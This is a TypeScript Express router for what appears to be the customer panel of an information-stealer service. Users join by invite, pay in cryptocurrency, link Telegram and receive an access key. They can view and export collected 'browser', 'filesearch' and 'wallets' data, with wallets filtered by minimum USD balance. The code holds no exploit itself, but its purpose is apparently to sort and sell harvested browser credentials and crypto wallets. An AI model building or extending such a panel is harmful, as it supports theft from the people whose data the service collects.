import express from 'express';
import path from 'path';
import {
  AuthenticatedRequest,
  requireAuth,
  requireAdmin,
  requireAuthHTML,
} from '../middleware/auth';
import { requireTelegramLinkedHTML } from '../middleware/telegram';
import { requireActiveSubscription } from '../middleware/subscription';
import {
  SubmissionService,
  getDashboardSubmissionsAll,
  getDashboardSubmissions,
} from '../services/submissionService';
import { UserService } from '../services/userService';
import { SubscriptionService } from '../services/subscriptionService';
import { PaymentService } from '../services/paymentService';
import { SUBSCRIPTION_TIERS } from '../config/subscriptionConfig';
import { NotificationService } from '../services/notificationService';
import { LiveUpdateService } from '../services/liveUpdateService';
import { z } from 'zod';
import { Logger } from '../utils/logger';

const router = express.Router();

// Serve dashboard HTML
router.get(
  '/',
  requireAuthHTML,
  requireTelegramLinkedHTML,
  async (req: AuthenticatedRequest, res) => {
    // At this point requireAuthHTML has enforced auth and subscription gating.
    // Provide a minimal JSON handshake for SPA or redirect fallback.
    res.json({
      ok: true,
      user: { id: req.session.userId, username: req.session.username },
    });
  },
);

// Get user's submissions
router.get('/api/submissions', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const result = await SubmissionService.getUserSubmissionsWithSubscriptionCheck(req.user!.id);

    if (result.requiresSubscription) {
      res.json({
        submissions: [],
        requiresSubscription: true,
        message: 'Purchase a subscription to view your submissions',
      });
    } else {
      res.json({
        browser: result.browser || [],
        filesearch: result.filesearch || [],
        wallets: result.wallets || [],
        browserStats: result.browserStats || {},
      });
    }
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get user's subscription status
router.get('/api/subscription-status', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    // Admin users always have access (no subscription required)
    if (req.user!.isAdmin) {
      return res.json({
        has_active_subscription: true,
        admin_access: true,
      });
    }

    const subscription = await SubscriptionService.getUserActiveSubscription(req.user!.id);

    if (subscription) {
      const endDate = new Date(subscription.end_date);
      const now = new Date();
      const daysRemaining = Math.ceil((endDate.getTime() - now.getTime()) / (1000 * 60 * 60 * 24));

      res.json({
        has_active_subscription: true,
        subscription,
        days_remaining: Math.max(0, daysRemaining),
      });
    } else {
      res.json({
        has_active_subscription: false,
      });
    }
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get user's invites
router.get('/api/invites', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const invites = await UserService.getUserInvites(req.user!.id);
    res.json({ invites });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Create new invite
router.post('/api/invites', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    // Check if user has available invites (non-admins need to have unused invites they created)
    if (!req.user!.isAdmin) {
      const availableCount = await UserService.getUserAvailableInviteCount(req.user!.id);
      if (availableCount === 0) {
        return res.status(403).json({
          error:
            'You have no available invite codes to create. You can only use assigned invites, not create new ones.',
        });
      }
    }

    const code = await UserService.createInvite(req.user!.id);
    res.json({ message: 'Invite created successfully', code });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Delete invite (if we add this functionality to dashboard in the future)
router.delete('/api/invites/:id', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const { id } = req.params;
    await UserService.deleteInvite(parseInt(id));
    res.json({ message: 'Invite deleted successfully' });
  } catch (error: any) {
    if (error.message === 'Cannot delete used invites') {
      return res.status(400).json({ error: 'Cannot delete invites that have already been used' });
    }
    res.status(500).json({ error: error.message });
  }
});

// Get user's access key
router.get('/api/access-key', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const accessKey = await UserService.getUserAccessKey(req.user!.id);
    res.json({ accessKey });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Regenerate user's access key
router.post('/api/access-key/regenerate', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const newAccessKey = await UserService.regenerateAccessKey(req.user!.id);
    Logger.info('Access key regenerated', { userId: req.user!.id, username: req.user!.username });
    res.json({
      accessKey: newAccessKey,
      message: 'Access key regenerated successfully',
    });
  } catch (error: any) {
    Logger.error('Failed to regenerate access key', {
      userId: req.user!.id,
      error: error.message,
    });
    res.status(500).json({ error: error.message });
  }
});

/**
 * POST /api/subscribe
 * Initiate a subscription purchase from dashboard
 */
router.post('/api/subscribe', requireAuth, async (req: AuthenticatedRequest, res) => {
  // Validate input using zod
  const schema = z.object({
    subscription_type: z.enum(['WEEK', 'MONTH', 'THREE_MONTHS']),
  });

  const parseResult = schema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({ error: 'Valid subscription_type is required' });
  }

  try {
    const { subscription_type } = parseResult.data;
    const { payment, paymentLink } = await PaymentService.createPayment(
      req.user!.id,
      subscription_type,
    );

    res.json({
      payment_id: payment.id,
      payment_link: paymentLink,
      track_id: payment.oxapayTrackId,
      amount: payment.amount,
      expires_at: payment.expiresAt,
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

/**
 * POST /api/purchase-invites
 * Purchase invite codes for already registered users
 */
router.post('/api/purchase-invites', requireAuth, async (req: AuthenticatedRequest, res) => {
  // Validate input using zod
  const schema = z.object({
    invite_count: z.number().int().min(1).max(50).default(1),
  });

  const parseResult = schema.safeParse(req.body);
  if (!parseResult.success) {
    return res.status(400).json({
      error: 'Valid invite_count is required (1-50 invites)',
    });
  }

  try {
    const { invite_count } = parseResult.data;
    const { payment, paymentLink } = await PaymentService.createInvitePayment(
      req.user!.id,
      invite_count,
    );

    res.json({
      payment_id: payment.id,
      payment_link: paymentLink,
      track_id: payment.oxapayTrackId,
      amount: parseFloat(payment.amount),
      expires_at: payment.expiresAt,
      invite_count,
      price_per_invite: parseFloat((parseFloat(payment.amount) / invite_count).toFixed(2)),
    });
  } catch (error: any) {
    Logger.error('Error creating invite purchase', {
      userId: req.user!.id,
      error: error.message,
    });
    res.status(500).json({ error: error.message });
  }
});

// Get user notifications
router.get('/api/notifications', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const notifications = await NotificationService.getUserNotifications(req.user!.id);
    const unreadCount = await NotificationService.getUnreadCount(req.user!.id);
    res.json({ notifications, unreadCount });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Mark notification as read
router.post('/api/notifications/:id/read', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const notificationId = parseInt(req.params.id);
    await NotificationService.markAsRead(notificationId, req.user!.id);
    res.json({ message: 'Notification marked as read' });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Mark all notifications as read
router.post('/api/notifications/read-all', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    await NotificationService.markAllAsRead(req.user!.id);
    res.json({ message: 'All notifications marked as read' });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Check payment status and update UI
router.get('/api/payment-status/:trackId', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const { trackId } = req.params;
    const payment = await PaymentService.getPaymentByTrackId(trackId);

    if (!payment || payment.userId !== req.user!.id) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    // If payment is still pending, check with Oxapay
    if (payment.status === 'pending') {
      try {
        const oxapayStatus = await PaymentService.verifyPayment(trackId);
        if (oxapayStatus.status === 'Paid') {
          await PaymentService.updatePaymentStatus(payment.id, 'paid', oxapayStatus.txID);
          payment.status = 'paid';
        }
      } catch (error) {
        Logger.error('Error checking payment status', {
          trackId,
          userId: req.user!.id,
          paymentId: payment.id,
          error: error instanceof Error ? error.message : String(error),
        });
      }
    }

    res.json({ payment });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Admin dashboard submissions endpoint
router.get('/api/admin/dashboard/submissions', requireAdmin, async (req, res) => {
  try {
    const submissions = await getDashboardSubmissionsAll();
    res.status(200).json(submissions);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch all dashboard submissions' });
  }
});

// Get admin invite statistics
router.get('/api/admin/invite-stats', requireAdmin, async (req: AuthenticatedRequest, res) => {
  try {
    const { db } = await import('../db/connection');
    const { users, invites } = await import('../db/schema');
    const { sql, eq, desc } = await import('drizzle-orm');

    // Get user who has invited the most people (count of used invites they created)
    const result = await db
      .select({
        username: users.username,
        inviteCount: sql<number>`COUNT(CASE WHEN ${invites.usedBy} IS NOT NULL THEN 1 END)`.as(
          'invite_count',
        ),
      })
      .from(users)
      .leftJoin(invites, eq(users.id, invites.createdBy))
      .where(eq(users.isAdmin, false))
      .groupBy(users.id, users.username)
      .orderBy(desc(sql<number>`COUNT(CASE WHEN ${invites.usedBy} IS NOT NULL THEN 1 END)`))
      .limit(1);

    const topInviteCreator = result[0] || { username: 'None', inviteCount: 0 };

    res.json({
      topInviteCreator: {
        username: topInviteCreator.username,
        invite_count: topInviteCreator.inviteCount,
      },
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get current global announcement for users
router.get('/api/announcement', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const { db } = await import('../db/connection');
    const { globalAnnouncements } = await import('../db/schema');
    const { desc, sql } = await import('drizzle-orm');

    const result = await db
      .select({
        id: globalAnnouncements.id,
        title: globalAnnouncements.title,
        message: globalAnnouncements.message,
        createdAt: globalAnnouncements.createdAt,
      })
      .from(globalAnnouncements)
      .where(
        sql`${globalAnnouncements.isActive} = true AND (${globalAnnouncements.isPermanent} = true OR ${globalAnnouncements.expiresAt} > now())`,
      )
      .orderBy(desc(globalAnnouncements.createdAt))
      .limit(1);

    const announcement = result[0] || null;

    res.json({ announcement });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Server-Sent Events endpoint for live updates
router.get('/api/live-updates', requireAuth, (req: AuthenticatedRequest, res) => {
  // Set SSE headers
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Cache-Control',
  });

  const userId = req.user!.id;
  const clientId = `client_${userId}_${Date.now()}`;

  // Add client to live update service
  LiveUpdateService.addClient(userId, res, clientId);

  // Send initial connection event
  res.write(`event: connected\n`);
  res.write(
    `data: ${JSON.stringify({ message: 'Connected to live updates', timestamp: Date.now() })}\n\n`,
  );

  // Client cleanup is handled by LiveUpdateService
});

// Export data endpoints for users
router.get('/api/export/:section', requireAuth, async (req: AuthenticatedRequest, res) => {
  try {
    const { section } = req.params;
    const { format, keyword, minBalance } = req.query;
    const userId = req.user!.id;

    let data: any[] = [];
    let filename = '';

    const dashboardData = await getDashboardSubmissions(userId);

    switch (section) {
      case 'browser':
        data = dashboardData.browser || [];
        filename = `my_browser_data_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'filesearch':
        data = dashboardData.filesearch || [];
        filename = `my_filesearch_data_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'wallets':
        data = dashboardData.wallets || [];
        filename = `my_wallets_data_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'all':
        data = [
          ...dashboardData.browser.map((item: any) => ({ ...item, section: 'browser' })),
          ...dashboardData.filesearch.map((item: any) => ({ ...item, section: 'filesearch' })),
          ...dashboardData.wallets.map((item: any) => ({ ...item, section: 'wallets' })),
        ];
        filename = `my_all_data_${new Date().toISOString().split('T')[0]}`;
        break;
      default:
        return res
          .status(400)
          .json({ error: 'Invalid section. Must be browser, filesearch, wallets, or all' });
    }

    // Apply filters
    if (keyword) {
      const keywordStr = keyword.toString().toLowerCase();
      data = data.filter((item) => {
        const searchText = JSON.stringify(item).toLowerCase();
        return searchText.includes(keywordStr);
      });
      filename += `_filtered_${keywordStr}`;
    }

    if (minBalance && (section === 'wallets' || section === 'filesearch' || section === 'all')) {
      const minBal = parseFloat(minBalance.toString());
      data = data.filter((item) => {
        if (section === 'wallets' || item.section === 'wallets') {
          return (item.balance_usd || 0) >= minBal;
        }
        if (section === 'filesearch' || item.section === 'filesearch') {
          try {
            const parsedData = typeof item.data === 'string' ? JSON.parse(item.data) : item.data;
            return (parsedData.balance || 0) >= minBal;
          } catch {
            return false;
          }
        }
        return true;
      });
      filename += `_minbal_${minBalance}`;
    }

    if (format === 'csv') {
      const csv = convertToCSV(data);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.csv"`);
      res.send(csv);
    } else {
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.json"`);
      res.json(data);
    }
  } catch (error: any) {
    Logger.error('User export error', { userId: req.user?.id, error: error.message });
    res.status(500).json({ error: error.message });
  }
});

// Helper function to convert data to CSV
function convertToCSV(data: any[]): string {
  if (data.length === 0) return '';

  const headers = Object.keys(data[0]);
  const csvHeaders = headers.join(',');

  const csvRows = data.map((row) => {
    return headers
      .map((header) => {
        const value = row[header];
        if (value === null || value === undefined) return '';
        if (typeof value === 'object') return `"${JSON.stringify(value).replace(/"/g, '""')}"`;
        return `"${value.toString().replace(/"/g, '""')}"`;
      })
      .join(',');
  });

  return [csvHeaders, ...csvRows].join('\n');
}

export default router;
